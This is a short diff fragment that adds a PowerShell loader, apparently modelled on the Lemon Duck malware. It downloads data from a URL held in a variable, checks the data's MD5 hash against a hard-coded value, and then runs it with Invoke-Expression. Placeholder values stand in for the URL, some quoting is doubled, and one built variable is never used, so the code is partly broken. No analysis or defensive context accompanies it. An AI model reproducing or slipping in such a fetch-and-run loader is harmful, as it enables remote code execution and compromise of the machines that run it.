@@ -1,0 +1,6 @@
+$Lemon_Duck=''_T'';
+$y=''_U'';
+$z=$y+''p''+'''+$v+''';
+$m=(New-Object System.Net.WebClient).DownloadData($y);
+[System.Security.Cryptography.MD5]::Create().ComputeHash($m)|foreach{$s+=$_.ToString(''x2'')};
+if($s-eq''d8109cec0a51719be6f411f67b3b7ec1''){IEX(-join[char[]]$m)}
